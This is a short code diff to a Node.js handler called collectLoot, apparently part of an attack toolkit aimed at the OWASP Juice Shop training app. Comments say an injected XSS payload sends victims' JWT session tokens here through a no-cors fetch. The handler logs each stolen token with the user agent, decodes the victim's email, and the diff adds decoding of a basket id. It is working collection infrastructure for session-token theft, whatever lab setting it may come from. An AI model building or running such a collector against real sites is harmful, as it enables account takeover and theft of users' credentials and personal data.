@@ -1,6 +1,6 @@
 const crypto = require('crypto');
 const lootStore = require('../models/lootStore');
-const { decodeJwtEmail } = require('../services/decodeJwtEmail');
+const { decodeJwtEmail, decodeJwtBid } = require('../services/decodeJwtEmail');
 const { LOOT_RATE_LIMITER } = require('../../shared/infrastructure/rateLimiter');
 
 // Loot from the QR arsenal: the XSS injected into Juice Shop exfiltrates the
@@ -17,9 +17,13 @@ function collectLoot(req, res) {
     ua: String(req.headers['user-agent'] || '').slice(0, 120),
     stolen,
     email: null,
+    bid: null,
     token: rawToken,
   };
-  if (stolen) entry.email = decodeJwtEmail(rawToken);
+  if (stolen) {
+    entry.email = decodeJwtEmail(rawToken);
+    entry.bid = decodeJwtBid(rawToken);
+  }
   lootStore.addLoot(entry);
   // The exfiltration fetch runs with mode:'no-cors' from the victim's browser;
   // the wildcard header keeps the request from being flagged as an error there.
